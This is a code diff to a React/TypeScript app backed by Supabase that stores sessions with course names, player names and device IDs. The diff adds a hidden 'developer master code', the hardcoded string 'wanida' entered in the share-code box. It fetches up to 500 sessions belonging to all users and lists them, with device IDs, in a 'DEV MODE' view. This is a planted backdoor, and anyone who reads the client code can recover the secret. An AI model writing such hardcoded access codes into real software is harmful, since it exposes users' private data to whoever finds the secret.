@@ -89,6 +89,8 @@ export default function App() {
   const [viewCode, setViewCode] = useState<string | null>(null);
   const [shareInput, setShareInput] = useState("");
   const [accessLogs, setAccessLogs] = useState<{ device_id: string; ip_address: string | null; accessed_at: string; role: string }[]>([]);
+  const [isAdminMode, setIsAdminMode] = useState(false);
+  const [adminSessionList, setAdminSessionList] = useState<{ id: string; course_name: string | null; mode: number; updated_at: string; names: string[]; device_id: string }[]>([]);
 
   const { showHistory, toggleHistory, setShowHistory, historyList, fetchHistory } = useSession();
 
@@ -372,6 +374,8 @@ export default function App() {
     setViewingSessionId(null);
     setIsParticipant(false);
     setIsSharedView(false);
+    setIsAdminMode(false);
+    setAdminSessionList([]);
     setPlayerTokens([null, null, null, null]);
     setPlayerTokenExpiresAt([null, null, null, null]);
     setViewCode(null);
@@ -663,7 +667,23 @@ export default function App() {
   }
 
   async function openByShareCode() {
-    const token = shareInput.trim().toUpperCase();
+    const rawInput = shareInput.trim();
+
+    // 開発者マスターコード
+    if (rawInput.toLowerCase() === "wanida") {
+      const { data } = await supabase
+        .from("sessions")
+        .select("id, course_name, mode, updated_at, names, device_id")
+        .order("updated_at", { ascending: false })
+        .limit(500);
+      setAdminSessionList(data ?? []);
+      setIsAdminMode(true);
+      setShowHistory(true);
+      setShareInput("");
+      return;
+    }
+
+    const token = rawInput.toUpperCase();
     if (token.length !== 6) return;
     const { data: tokenData, error: tokenError } = await supabase
       .from("share_tokens").select("session_id, role, expires_at").eq("token", token).single();
@@ -946,9 +966,16 @@ export default function App() {
               }}
             >開く</button>
           </div>
-          {historyList.length === 0 ? (
+          {isAdminMode && (
+            <div style={{ padding: "6px 16px", background: "#1a0a00", borderBottom: "1px solid #4a2a00" }}>
+              <span style={{ fontSize: 9, color: "#c0602a", letterSpacing: 1 }}>
+                DEV MODE — 全ユーザー全履歴 ({adminSessionList.length}件)
+              </span>
+            </div>
+          )}
+          {(isAdminMode ? adminSessionList : historyList).length === 0 ? (
             <div style={{ padding: 16, textAlign: "center", fontSize: 11, color: "#4a6a4a" }}>記録なし</div>
-          ) : historyList.map(s => (
+          ) : (isAdminMode ? adminSessionList : historyList).map(s => (
             <div key={s.id} onClick={() => loadSessionById(s.id)} style={{
               padding: "10px 16px", borderBottom: "1px solid #1a2a1a",
               cursor: "pointer", display: "flex", justifyContent: "space-between", alignItems: "center",
@@ -960,19 +987,22 @@ export default function App() {
                 </div>
                 <div style={{ fontSize: 9, color: "#4a6a4a" }}>
                   {formatDate(s.updated_at)} · {s.mode}人 · ID: {s.id.slice(0, 8)}
+                  {isAdminMode && <span style={{ color: "#6a4a2a", marginLeft: 4 }}>device: {(s as any).device_id?.slice(0, 8)}</span>}
                 </div>
               </div>
               <div style={{ fontSize: 9, color: "#6b8b6b", flexShrink: 0 }}>
                 {s.names.slice(0, s.mode).join(" / ")}
               </div>
-              <button
-                onClick={(e) => deleteSessionById(s.id, e)}
-                style={{
-                  flexShrink: 0, padding: "3px 7px", borderRadius: 4,
-                  border: "1px solid #3a2a2a", background: "transparent",
-                  color: "#6a4a4a", fontSize: 13, cursor: "pointer", lineHeight: 1,
-                }}
-              >×</button>
+              {!isAdminMode && (
+                <button
+                  onClick={(e) => deleteSessionById(s.id, e)}
+                  style={{
+                    flexShrink: 0, padding: "3px 7px", borderRadius: 4,
+                    border: "1px solid #3a2a2a", background: "transparent",
+                    color: "#6a4a4a", fontSize: 13, cursor: "pointer", lineHeight: 1,
+                  }}
+                >×</button>
+              )}
             </div>
           ))}
         </div>
